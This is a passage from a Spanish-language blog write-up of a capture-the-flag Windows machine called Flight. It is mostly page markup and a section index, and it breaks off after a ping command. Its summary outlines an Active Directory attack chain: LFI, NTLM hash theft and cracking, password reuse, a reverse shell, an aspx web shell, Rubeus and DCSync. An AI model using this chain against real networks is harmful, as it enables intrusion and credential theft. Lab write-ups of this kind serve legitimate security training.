<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/flight/"><!-- Primary Meta Tags --><title>Flight • Cybersecurity</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Flight • Cybersecurity"><meta name="description" content="Flight es una máquina Windows que comienza con un sitio web con dos hosts virtuales diferentes. Uno de ellos es vulnerable a LFI y permite a un atacante recuperar un hash NTLM. Una vez descifrado, la contraseña de texto claro obtenida se distribuirá en una lista de nombres de usuario válidos para descubrir un escenario de reutilización de contraseñas. Una vez que el atacante tiene acceso SMB como el usuario `s.moon`, puede escribir en un recurso compartido al que acceden otros usuarios. Se pueden usar ciertos archivos para robar el hash NTLMv2 de los usuarios que acceden al recurso compartido. Una vez que se descifra el segundo hash, el atacante podrá escribir un shell inverso en un recurso compartido que aloja los archivos web y obtener un shell en el equipo como usuario con pocos privilegios. Al tener credenciales para el usuario `c.bum`, será posible obtener un shell como este usuario, lo que permitirá al atacante escribir un shell web `aspx` en un sitio web que está configurado para escuchar solo en el host local. Una vez que el atacante ejecuta el comando como la cuenta virtual de Microsoft, puede ejecutar Rubeus para obtener un ticket para la cuenta de la máquina que se puede usar para realizar un ataque DCSync y, en última instancia, obtener los hashes para el usuario administrador."><meta name="author" content="GalileoQ"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/flight/"><meta property="og:title" content="Flight"><meta property="og:description" content="Flight es una máquina Windows que comienza con un sitio web con dos hosts virtuales diferentes. Uno de ellos es vulnerable a LFI y permite a un atacante recuperar un hash NTLM. Una vez descifrado, la contraseña de texto claro obtenida se distribuirá en una lista de nombres de usuario válidos para descubrir un escenario de reutilización de contraseñas. Una vez que el atacante tiene acceso SMB como el usuario `s.moon`, puede escribir en un recurso compartido al que acceden otros usuarios. Se pueden usar ciertos archivos para robar el hash NTLMv2 de los usuarios que acceden al recurso compartido. Una vez que se descifra el segundo hash, el atacante podrá escribir un shell inverso en un recurso compartido que aloja los archivos web y obtener un shell en el equipo como usuario con pocos privilegios. Al tener credenciales para el usuario `c.bum`, será posible obtener un shell como este usuario, lo que permitirá al atacante escribir un shell web `aspx` en un sitio web que está configurado para escuchar solo en el host local. Una vez que el atacante ejecuta el comando como la cuenta virtual de Microsoft, puede ejecutar Rubeus para obtener un ticket para la cuenta de la máquina que se puede usar para realizar un ataque DCSync y, en última instancia, obtener los hashes para el usuario administrador."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/Flight.Eg-9T8Y_.png"><meta property="article:author" content="GalileoQ"><meta property="article:published_time" content="2024-10-07T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/flight/"><meta property="twitter:title" content="Flight"><meta property="twitter:description" content="Flight es una máquina Windows que comienza con un sitio web con dos hosts virtuales diferentes. Uno de ellos es vulnerable a LFI y permite a un atacante recuperar un hash NTLM. Una vez descifrado, la contraseña de texto claro obtenida se distribuirá en una lista de nombres de usuario válidos para descubrir un escenario de reutilización de contraseñas. Una vez que el atacante tiene acceso SMB como el usuario `s.moon`, puede escribir en un recurso compartido al que acceden otros usuarios. Se pueden usar ciertos archivos para robar el hash NTLMv2 de los usuarios que acceden al recurso compartido. Una vez que se descifra el segundo hash, el atacante podrá escribir un shell inverso en un recurso compartido que aloja los archivos web y obtener un shell en el equipo como usuario con pocos privilegios. Al tener credenciales para el usuario `c.bum`, será posible obtener un shell como este usuario, lo que permitirá al atacante escribir un shell web `aspx` en un sitio web que está configurado para escuchar solo en el host local. Una vez que el atacante ejecuta el comando como la cuenta virtual de Microsoft, puede ejecutar Rubeus para obtener un ticket para la cuenta de la máquina que se puede usar para realizar un ataque DCSync y, en última instancia, obtener los hashes para el usuario administrador."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/Flight.Eg-9T8Y_.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Cybersecurity" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728615231745; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.O4GOj98Y.css" />
<link rel="stylesheet" href="/_astro/_slug_.oMQiyPoD.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/danielcgilibert/blog-template" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://github.com/danielcgilibert/blog-template" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2024-10-07T04:00:00.000Z"> Oct 7, 2024 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 8 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Flight </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/hard" aria-label="Hard"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Hard </span> </a><a href="/tags/windows" aria-label="Windows"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Windows </span> </a><a href="/tags/activedirectory" aria-label="ActiveDirectory"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> ActiveDirectory </span> </a> </div> </header> <img src="/_astro/Flight.Eg-9T8Y__Y1seT.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[800px] my-8 object-cover" alt="img of Flight" width="1000" height="500" decoding="async" class="rounded-md w-full max-h-[300px] md:max-h-[500px] object-cover"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/flight/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/flight/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#ping" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Ping </a>  </li><li class="flex flex-col"> <a href="#ttl--127-windows" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> TTL = 127 Windows </a>  </li><li class="flex flex-col"> <a href="#nmap" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> nmap </a>  </li><li class="flex flex-col"> <a href="#enumeración-del-puerto-80-http" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Enumeración del puerto 80 (HTTP) </a>  </li><li class="flex flex-col"> <a href="#fuzzing-con-wfuzz" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Fuzzing con wfuzz </a>  </li><li class="flex flex-col"> <a href="#enumeración-del-puerto-53-dns" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Enumeración del puerto 53 (DNS) </a>  </li><li class="flex flex-col"> <a href="#dirsearch" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> dirsearch </a>  </li><li class="flex flex-col"> <a href="#fuzzing-con-wfuzz-1" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Fuzzing con wfuzz </a>  </li><li class="flex flex-col"> <a href="#responder" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> responder </a>  </li><li class="flex flex-col"> <a href="#hashcat" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> hashcat </a>  </li><li class="flex flex-col"> <a href="#validación-de-credenciales" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Validación de credenciales </a>  </li><li class="flex flex-col"> <a href="#crackmapexec" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> crackmapexec </a>  </li><li class="flex flex-col"> <a href="#crackmapexec-1" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> crackmapexec </a>  </li><li class="flex flex-col"> <a href="#crackmapexec-2" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> crackmapexec </a>  </li><li class="flex flex-col"> <a href="#responder-1" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Responder </a>  </li><li class="flex flex-col"> <a href="#crackmapexec-3" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> crackmapexec </a>  </li><li class="flex flex-col"> <a href="#smbclient" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> smbclient </a>  </li><li class="flex flex-col"> <a href="#reverse-shell" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Reverse shell </a>  </li><li class="flex flex-col"> <a href="#shell" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> shell </a>  </li><li class="flex flex-col"> <a href="#escalada-de-privilegios" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Escalada De privilegios </a>  </li><li class="flex flex-col"> <a href="#user-pivoting" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> User Pivoting </a>  </li><li class="flex flex-col"> <a href="#port-forwarding" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Port Forwarding </a>  </li><li class="flex flex-col"> <a href="#enumeración-del-puerto-8000-portforwarding" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Enumeración del puerto 8000 (PortForwarding) </a>  </li><li class="flex flex-col"> <a href="#we-are-root" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> WE ARE ROOT </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <h2 id="ping">Ping</h2>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">ping </span><span style="color:#AB5959;--shiki-dark:#89DDFF">-</span><span style="color:#393A34;--shiki-dark:#BABED8">c </span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#BABED8">PING</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#2F798A;--shiki-dark:#F78C6C">10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 56</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#2F798A;--shiki-dark:#F78C6C">84</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#998418;--shiki-dark:#FFCB6B"> bytes</span><span style="color:#393A34;--shiki-dark:#BABED8"> of data</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span></span>
<span class="line"><span style="color:#2F798A;--shiki-dark:#F78C6C">64</span><span style="color:#998418;--shiki-dark:#FFCB6B"> bytes</span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic"> from</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">11</span><span style="color:#999999;--shiki-dark:#89DDFF">.</span><span style="color:#393A34;--shiki-dark:#F07178">187</span><span style="color:#999999;--shiki-dark:#89DDFF">:</span><span style="color:#393A34;--shiki-dark:#BABED8"> icmp_seq</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#393A34;--shiki-dark:#BABED8"> ttl</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">127</span><span style="color:#393A34;--shiki-dark:#BABED8"> time</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">155</span><span style="color:#393A34;--shiki-dark:#BABED8"> ms</span></span>
<span class="line"></span>
